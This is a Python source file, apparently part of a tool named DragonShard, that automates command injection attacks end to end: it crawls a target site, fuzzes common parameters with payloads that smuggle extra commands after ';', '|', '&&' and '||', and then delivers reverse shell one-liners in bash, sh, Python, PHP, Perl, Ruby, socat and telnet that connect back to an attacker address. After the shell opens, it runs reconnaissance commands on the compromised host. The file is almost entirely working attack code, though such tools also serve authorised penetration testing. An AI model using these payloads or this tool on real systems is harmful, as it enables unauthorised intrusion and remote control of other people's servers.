#!/usr/bin/env python3
"""
DragonShard Command Injection Exploiter

This module provides end-to-end command injection exploitation:
1. Spider website to find endpoints
2. Test for command injection vulnerabilities
3. Exploit command injection to get reverse shell
4. Maintain connection and run commands
"""

import asyncio
import json
import logging
import re
import socket
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse

import httpx

from dragonshard.api_inference.crawler import FastCrawler
from dragonshard.executor.reverse_shell import ReverseShellHandler
from dragonshard.fuzzing.fuzzer import Fuzzer, FuzzResult

logger = logging.getLogger(__name__)


@dataclass
class CommandInjectionVulnerability:
    """Represents a discovered command injection vulnerability."""
    
    url: str
    parameter: str
    payload: str
    evidence: str
    confidence: float
    response_time: float
    status_code: int
    discovered_at: datetime
    exploit_method: str
    reverse_shell_payload: Optional[str] = None


@dataclass
class ExploitationResult:
    """Result of command injection exploitation."""
    
    vulnerability: CommandInjectionVulnerability
    reverse_shell_connection_id: Optional[str] = None
    reverse_shell_port: Optional[int] = None
    connection_successful: bool = False
    commands_executed: List[str] = None
    output_captured: List[str] = None
    exploitation_time: float = 0.0
    error_message: Optional[str] = None


class CommandInjectionExploiter:
    """
    End-to-end command injection exploitation system.
    
    Capabilities:
    - Spider websites to find endpoints
    - Test for command injection vulnerabilities
    - Exploit vulnerabilities to get reverse shells
    - Maintain connections and execute commands
    """
    
    def __init__(self, 
                 reverse_shell_handler: Optional[ReverseShellHandler] = None,
                 fuzzer: Optional[Fuzzer] = None,
                 crawler: Optional[FastCrawler] = None):
        """
        Initialize the command injection exploiter.
        
        Args:
            reverse_shell_handler: Reverse shell handler for managing connections
            fuzzer: Fuzzer for testing vulnerabilities
            crawler: Web crawler for discovering endpoints
        """
        self.reverse_shell_handler = reverse_shell_handler or ReverseShellHandler()
        self.fuzzer = fuzzer or Fuzzer()
        self.crawler = crawler or FastCrawler(max_depth=2, max_pages=20)
        
        # Command injection payloads
        self.command_injection_payloads = [
            # Basic command injection
            "; ls",
            "| ls",
            "&& ls",
            "|| ls",
            "; whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "; id",
            "| id",
            "&& id",
            "|| id",
            
            # Native bash reverse shell (most common)
            "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "| bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "&& bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "|| bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            
            # Native sh reverse shell (fallback)
            "; sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "| sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "&& sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "|| sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            
            # Python reverse shell (if available)
            "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
            "| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
            
            # Python3 reverse shell (if available)
            "; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
            "| python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
            
            # PHP reverse shell (if available)
            "; php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
            "| php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
            
            # Perl reverse shell (if available)
            "; perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "| perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            
            # Ruby reverse shell (if available)
            "; ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"ATTACKER_IP\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
            "| ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"ATTACKER_IP\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
            
            # Socat reverse shell (if available)
            "; socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash",
            "| socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash",
            
            # Telnet reverse shell (if available)
            "; telnet ATTACKER_IP 4444 | /bin/bash | telnet ATTACKER_IP 4445",
            "| telnet ATTACKER_IP 4444 | /bin/bash | telnet ATTACKER_IP 4445",
        ]
        
        # Detection patterns for command injection
        self.detection_patterns = [
            r"root\s+\d+\s+\d+",  # whoami output
            r"uid=\d+\([^)]+\)",  # id command output
            r"total\s+\d+",  # ls output
            r"bin\s+boot\s+dev",  # ls / output
            r"Linux\s+[^\s]+",  # uname -a output
            r"PING\s+[^\s]+",  # ping output
            r"bash:\s+[^:]+:",  # bash error messages
            r"sh:\s+[^:]+:",  # sh error messages
            r"/bin/bash",  # bash path in output
            r"/bin/sh",  # sh path in output
            r"python[23]?\s+[^\s]+",  # python command output
            r"perl\s+[^\s]+",  # perl command output
            r"ruby\s+[^\s]+",  # ruby command output
            r"php\s+[^\s]+",  # php command output
            r"socat\s+[^\s]+",  # socat command output
            r"telnet\s+[^\s]+",  # telnet command output
        ]
        
        self.discovered_vulnerabilities: List[CommandInjectionVulnerability] = []
        self.exploitation_results: List[ExploitationResult] = []
        
    def spider_website(self, base_url: str) -> Set[str]:
        """
        Spider a website to discover endpoints.
        
        Args:
            base_url: The base URL to start crawling from
            
        Returns:
            Set of discovered URLs
        """
        logger.info(f"Spidering website: {base_url}")
        
        try:
            discovered_urls = self.crawler.crawl(base_url)
            logger.info(f"Discovered {len(discovered_urls)} URLs")
            return discovered_urls
        except Exception as e:
            logger.error(f"Error spidering website {base_url}: {e}")
            return {base_url}  # Return at least the base URL
    
    def test_for_command_injection(self, url: str, parameter: str, payload: str) -> Optional[CommandInjectionVulnerability]:
        """
        Test a specific URL and parameter for command injection vulnerability.
        
        Args:
            url: The URL to test
            parameter: The parameter to inject into
            payload: The command injection payload to test
            
        Returns:
            CommandInjectionVulnerability if found, None otherwise
        """
        try:
            # Prepare the test payload
            test_payload = payload.replace("ATTACKER_IP", "127.0.0.1")
            
            # Determine if this is GET or POST parameter
            if "?" in url:
                # GET parameter
                test_url = f"{url}&{parameter}={test_payload}" if "&" in url else f"{url}?{parameter}={test_payload}"
                response = self.fuzzer.client.get(test_url, timeout=10)
            else:
                # POST parameter
                data = {parameter: test_payload}
                response = self.fuzzer.client.post(url, data=data, timeout=10)
            
            # Analyze response for command injection indicators
            is_vulnerable, evidence, confidence = self._analyze_command_injection_response(
                response.text, response.status_code, test_payload
            )
            
            if is_vulnerable:
                vulnerability = CommandInjectionVulnerability(
                    url=url,
                    parameter=parameter,
                    payload=test_payload,
                    evidence=evidence,
                    confidence=confidence,
                    response_time=response.elapsed.total_seconds(),
                    status_code=response.status_code,
                    discovered_at=datetime.now(),
                    exploit_method=self._determine_exploit_method(test_payload)
                )
                
                logger.info(f"Command injection vulnerability found: {url} - {parameter}")
                return vulnerability
                
        except Exception as e:
            logger.debug(f"Error testing {url} with payload {payload}: {e}")
            
        return None
    
    def _analyze_command_injection_response(self, response_text: str, status_code: int, payload: str) -> Tuple[bool, str, float]:
        """
        Analyze response for command injection indicators.
        
        Args:
            response_text: The response body
            status_code: The HTTP status code
            payload: The payload that was tested
            
        Returns:
            Tuple of (is_vulnerable, evidence, confidence)
        """
        evidence = ""
        confidence = 0.0
        
        # Check for command injection patterns
        for pattern in self.detection_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                evidence = f"Command output detected: {pattern}"
                confidence = 0.8
                break
        
        # Check for error messages that indicate command execution
        error_indicators = [
            "bash:", "sh:", "/bin/bash", "/bin/sh", "command not found",
            "Permission denied", "No such file or directory"
        ]
        
        for indicator in error_indicators:
            if indicator.lower() in response_text.lower():
                evidence = f"Shell error detected: {indicator}"
                confidence = 0.7
                break
        
        # Check for timing-based detection
        if "ping" in payload.lower() and "PING" in response_text.upper():
            evidence = "Ping command output detected"
            confidence = 0.9
        
        # Check for specific command outputs
        if "whoami" in payload.lower() and any(x in response_text.lower() for x in ["root", "www-data", "apache"]):
            evidence = "whoami command output detected"
            confidence = 0.9
        
        if "ls" in payload.lower() and "total" in response_text.lower():
            evidence = "ls command output detected"
            confidence = 0.8
        
        is_vulnerable = confidence > 0.6
        return is_vulnerable, evidence, confidence
    
    def _determine_exploit_method(self, payload: str) -> str:
        """Determine the best exploit method based on the payload."""
        if "bash -i" in payload:
            return "bash_reverse_shell"
        elif "sh -i" in payload:
            return "sh_reverse_shell"
        elif "python3" in payload:
            return "python3_reverse_shell"
        elif "python" in payload:
            return "python_reverse_shell"
        elif "php" in payload:
            return "php_reverse_shell"
        elif "perl" in payload:
            return "perl_reverse_shell"
        elif "ruby" in payload:
            return "ruby_reverse_shell"
        elif "socat" in payload:
            return "socat_reverse_shell"
        elif "telnet" in payload:
            return "telnet_reverse_shell"
        elif "nc" in payload:
            return "netcat_reverse_shell"  # Fallback for netcat if available
        else:
            return "bash_reverse_shell"  # Default to bash as it's most common
    
    def discover_command_injection_vulnerabilities(self, base_url: str) -> List[CommandInjectionVulnerability]:
        """
        Discover command injection vulnerabilities on a website.
        
        Args:
            base_url: The base URL to test
            
        Returns:
            List of discovered command injection vulnerabilities
        """
        logger.info(f"Starting command injection discovery on: {base_url}")
        
        # Spider the website
        discovered_urls = self.spider_website(base_url)
        
        vulnerabilities = []
        
        # Common parameters to test
        common_parameters = [
            "command", "cmd", "exec", "system", "shell", "ping", "host",
            "input", "query", "search", "file", "path", "url", "target"
        ]
        
        for url in discovered_urls:
            logger.debug(f"Testing URL: {url}")
            
            # Test each parameter with command injection payloads
            for parameter in common_parameters:
                for payload in self.command_injection_payloads:
                    vulnerability = self.test_for_command_injection(url, parameter, payload)
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        # Don't test more payloads for this parameter if we found a vulnerability
                        break
        
        self.discovered_vulnerabilities.extend(vulnerabilities)
        logger.info(f"Discovered {len(vulnerabilities)} command injection vulnerabilities")
        
        return vulnerabilities
    
    def exploit_command_injection(self, vulnerability: CommandInjectionVulnerability, 
                                attacker_ip: str = "127.0.0.1", 
                                attacker_port: int = 4444) -> ExploitationResult:
        """
        Exploit a command injection vulnerability to get a reverse shell.
        
        Args:
            vulnerability: The vulnerability to exploit
            attacker_ip: The attacker's IP address for reverse shell
            attacker_port: The attacker's port for reverse shell
            
        Returns:
            ExploitationResult with exploitation details
        """
        logger.info(f"Exploiting command injection vulnerability: {vulnerability.url}")
        
        start_time = time.time()
        result = ExploitationResult(
            vulnerability=vulnerability,
            commands_executed=[],
            output_captured=[]
        )
        
        try:
            # Create reverse shell listener
            connection_id = self.reverse_shell_handler.create_listener(attacker_port)
            result.reverse_shell_connection_id = connection_id
            result.reverse_shell_port = attacker_port
            
            # Wait a moment for the listener to be ready
            time.sleep(0.5)  # Reduced wait time for localhost
            
            # Prepare reverse shell payload
            reverse_shell_payload = self._create_reverse_shell_payload(
                vulnerability.exploit_method, attacker_ip, attacker_port
            )
            
            # Exploit the vulnerability
            success = self._execute_exploit_payload(
                vulnerability.url, vulnerability.parameter, reverse_shell_payload
            )
            
            if success:
                # Wait for connection with shorter timeout for localhost
                timeout = 3 if attacker_ip in ["127.0.0.1", "localhost"] else 10
                connection_established = self._wait_for_reverse_shell_connection(connection_id, timeout=timeout)
                
                if connection_established:
                    result.connection_successful = True
                    logger.info(f"Reverse shell connection established: {connection_id}")
                    
                    # Execute some basic commands
                    basic_commands = ["whoami", "id", "pwd", "ls -la", "uname -a"]
                    for cmd in basic_commands:
                        output = self._execute_command_on_shell(connection_id, cmd)
                        result.commands_executed.append(cmd)
                        result.output_captured.append(output)
                        
                else:
                    result.error_message = "Reverse shell connection failed to establish"
                    logger.warning("Reverse shell connection failed to establish")
            else:
                result.error_message = "Failed to execute exploit payload"
                logger.error("Failed to execute exploit payload")
                
        except Exception as e:
            result.error_message = str(e)
            logger.error(f"Error during exploitation: {e}")
        
        result.exploitation_time = time.time() - start_time
        self.exploitation_results.append(result)
        
        return result
    
    def _create_reverse_shell_payload(self, exploit_method: str, attacker_ip: str, attacker_port: int) -> str:
        """Create a reverse shell payload based on the exploit method."""
        
        payloads = {
            "bash_reverse_shell": f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
            "sh_reverse_shell": f"sh -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
            "python_reverse_shell": f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'""",
            "python3_reverse_shell": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'""",
            "php_reverse_shell": f"php -r '$sock=fsockopen(\"{attacker_ip}\",{attacker_port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
            "perl_reverse_shell": f"perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "ruby_reverse_shell": f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{attacker_ip}\",\"{attacker_port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            "socat_reverse_shell": f"socat TCP:{attacker_ip}:{attacker_port} EXEC:/bin/bash",
            "telnet_reverse_shell": f"telnet {attacker_ip} {attacker_port} | /bin/bash | telnet {attacker_ip} {attacker_port + 1}",
            "command_execution": f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
        }
        
        return payloads.get(exploit_method, payloads["bash_reverse_shell"])
    
    def _execute_exploit_payload(self, url: str, parameter: str, payload: str) -> bool:
        """Execute the exploit payload against the target."""
        try:
            if "?" in url:
                # GET parameter
                test_url = f"{url}&{parameter}={payload}" if "&" in url else f"{url}?{parameter}={payload}"
                response = self.fuzzer.client.get(test_url, timeout=10)
            else:
                # POST parameter
                data = {parameter: payload}
                response = self.fuzzer.client.post(url, data=data, timeout=10)
            
            # Consider it successful if we get a response (even if it's an error)
            return response.status_code < 500
            
        except Exception as e:
            logger.error(f"Error executing exploit payload: {e}")
            return False
    
    def _wait_for_reverse_shell_connection(self, connection_id: str, timeout: int = 5) -> bool:
        """Wait for a reverse shell connection to be established."""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            connection_info = self.reverse_shell_handler.get_connection_info(connection_id)
            if connection_info and connection_info.get("status") == "connected":
                return True
            time.sleep(0.1)  # Check more frequently
        
        return False
    
    def _execute_command_on_shell(self, connection_id: str, command: str) -> str:
        """Execute a command on the reverse shell and return the output."""
        try:
            success = self.reverse_shell_handler.send_command(connection_id, command)
            if success:
                # Wait a moment for output
                time.sleep(2)
                
                # Get console history
                history = self.reverse_shell_handler.get_console_history(connection_id, limit=10)
                return "\n".join(history[-5:])  # Return last 5 lines
            else:
                return f"Failed to execute command: {command}"
        except Exception as e:
            return f"Error executing command: {e}"
    
    def run_comprehensive_exploitation(self, target_url: str, 
                                     attacker_ip: str = "127.0.0.1",
                                     attacker_port: int = 4444,
                                     max_workers: int = 4) -> Dict[str, Any]:
        """
        Run comprehensive command injection exploitation with multi-threading.
        
        Args:
            target_url: The target URL to exploit
            attacker_ip: The attacker's IP address
            attacker_port: The attacker's port
            max_workers: Maximum number of concurrent exploitation threads
            
        Returns:
            Dictionary with exploitation results
        """
        logger.info(f"Starting comprehensive exploitation of: {target_url}")
        
        # Step 1: Discover vulnerabilities
        vulnerabilities = self.discover_command_injection_vulnerabilities(target_url)
        
        if not vulnerabilities:
            return {
                "success": False,
                "message": "No command injection vulnerabilities found",
                "vulnerabilities": [],
                "exploitations": []
            }
        
        # Step 2: Exploit vulnerabilities with multi-threading
        exploitations = []
        successful_exploitations = []
        
        def exploit_vulnerability(vuln: CommandInjectionVulnerability, port_offset: int) -> ExploitationResult:
            """Exploit a single vulnerability with a specific port."""
            return self.exploit_command_injection(
                vuln, attacker_ip, attacker_port + port_offset
            )
        
        # Use ThreadPoolExecutor for concurrent exploitation
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all exploitation tasks
            future_to_vuln = {
                executor.submit(exploit_vulnerability, vuln, i): vuln 
                for i, vuln in enumerate(vulnerabilities)
            }
            
            # Collect results as they complete
            for future in as_completed(future_to_vuln):
                vuln = future_to_vuln[future]
                try:
                    result = future.result()
                    exploitations.append(result)
                    
                    if result.connection_successful:
                        successful_exploitations.append(result)
                        logger.info(f"Successful exploitation: {vuln.url} - {vuln.parameter}")
                        
                        # Stop after first successful exploitation for efficiency
                        if len(successful_exploitations) >= 1:
                            # Cancel remaining tasks
                            for f in future_to_vuln:
                                if not f.done():
                                    f.cancel()
                            break
                            
                except Exception as e:
                    logger.error(f"Error exploiting {vuln.url}: {e}")
                    exploitations.append(ExploitationResult(
                        vulnerability=vuln,
                        error_message=str(e)
                    ))
        
        return {
            "success": len(successful_exploitations) > 0,
            "vulnerabilities": [v.__dict__ for v in vulnerabilities],
            "exploitations": [e.__dict__ for e in exploitations],
            "total_vulnerabilities": len(vulnerabilities),
            "successful_exploitations": len(successful_exploitations),
            "concurrent_exploitations": max_workers
        }
    
    def get_exploitation_summary(self) -> Dict[str, Any]:
        """Get a summary of all exploitation activities."""
        return {
            "total_vulnerabilities_discovered": len(self.discovered_vulnerabilities),
            "total_exploitations_attempted": len(self.exploitation_results),
            "successful_exploitations": len([r for r in self.exploitation_results if r.connection_successful]),
            "vulnerabilities": [v.__dict__ for v in self.discovered_vulnerabilities],
            "exploitations": [r.__dict__ for r in self.exploitation_results]
        } 